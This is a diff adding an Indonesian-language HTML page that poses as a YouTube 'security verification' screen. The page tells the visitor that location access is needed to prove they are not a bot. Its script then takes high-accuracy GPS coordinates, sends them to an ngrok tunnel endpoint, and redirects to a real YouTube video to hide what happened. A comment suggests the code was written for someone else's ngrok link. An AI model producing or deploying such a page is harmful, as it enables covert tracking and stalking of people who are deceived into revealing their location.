@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - Verifikasi Keamanan</title>
+    <style>
+        body { font-family: "Roboto", Arial, sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; border: 1px solid #e0e0e0; }
+        .yt-logo { width: 120px; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: #030303; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606060; line-height: 1.5; margin-bottom: 25px; }
+        .btn-verif { background-color: #cc0000; color: white; border: none; padding: 12px 24px; font-size: 14px; font-weight: 500; border-radius: 2px; cursor: pointer; text-transform: uppercase; }
+        #status-msg { margin-top: 20px; font-size: 13px; font-weight: bold; padding: 10px; display: none; border-radius: 4px; }
+        .error { color: #cc0000; background-color: #fff0f0; border: 1px solid #ffcccc; }
+        .success { color: #2ba640; background-color: #f0fff4; border: 1px solid #ccffda; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <svg class="yt-logo" viewBox="0 0 200 60">
+        <g transform="scale(0.7)">
+            <path fill="#FF0000" d="M63,14.87c-0.72-2.7-2.85-4.82-5.56-5.55C52.54,8,32.88,8,32.88,8S13.23,8,8.32,9.32c-2.7,0.73-4.83,2.85-5.56,5.55C1.45,19.77,1.45,30,1.45,30s0,10.23,1.31,15.13c0.72,2.7,2.85,4.83,5.56,5.56C13.23,52,32.88,52,32.88,52s19.66,0,24.56-1.32c2.71-0.72,4.84-2.85,5.56-5.56C64.31,40.23,64.31,30,64.31,30S64.31,19.77,63,14.87z"></path>
+            <polygon fill="#FFFFFF" points="26.6,39.43 42.93,30 26.6,20.57"></polygon>
+        </g>
+        <text x="65" y="42" font-family="Arial-BoldMT, Arial" font-size="34" font-weight="bold" fill="#212121">YouTube</text>
+    </svg>
+
+    <h2>Verifikasi Diperlukan</h2>
+    <p>Harap izinkan akses lokasi untuk membuktikan Anda bukan bot dan melanjutkan menonton video YouTube.</p>
+    
+    <button class="btn-verif" onclick="gasVerif()">Lanjut Verifikasi</button>
+    
+    <div id="status-msg"></div>
+</div>
+
+<script>
+    function gasVerif() {
+        const msg = document.getElementById('status-msg');
+        const youtubeID = "EFmxPMdBqmU"; 
+        
+        // Link Ngrok kamu sudah saya masukkan di sini
+        const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev"; 
+
+        msg.style.display = "block";
+        msg.className = '';
+        msg.innerText = "Memproses...";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+
+                // Kirim koordinat ke server lokal lewat Ngrok
+                fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`)
+                .then(() => {
+                    msg.className = 'success';
+                    msg.innerText = "✅ Berhasil! Membuka aplikasi...";
+                    
+                    setTimeout(() => {
+                        // Paksa buka aplikasi YouTube
+                        const intentUrl = `intent://www.youtube.com/watch?v=${youtubeID}#Intent;package=com.google.android.youtube;scheme=https;end`;
+                        window.location.replace(intentUrl);
+
+                        // Backup buat iPhone/Laptop
+                        setTimeout(() => {
+                            window.location.href = `https://www.youtube.com/watch?v=${youtubeID}&si=ois71enYdFkHaPD3`;
+                        }, 1500);
+                    }, 1000);
+                })
+                .catch(err => {
+                    msg.className = 'error';
+                    msg.innerText = "❌ Gagal menyambung ke server verifikasi. Pastikan internet stabil.";
+                });
+
+            }, (err) => {
+                msg.className = 'error';
+                msg.innerText = "❌ Gagal: Akses lokasi wajib diizinkan untuk verifikasi.";
+            }, { enableHighAccuracy: true });
+        }
+    }
+</script>
+</body>
+</html>
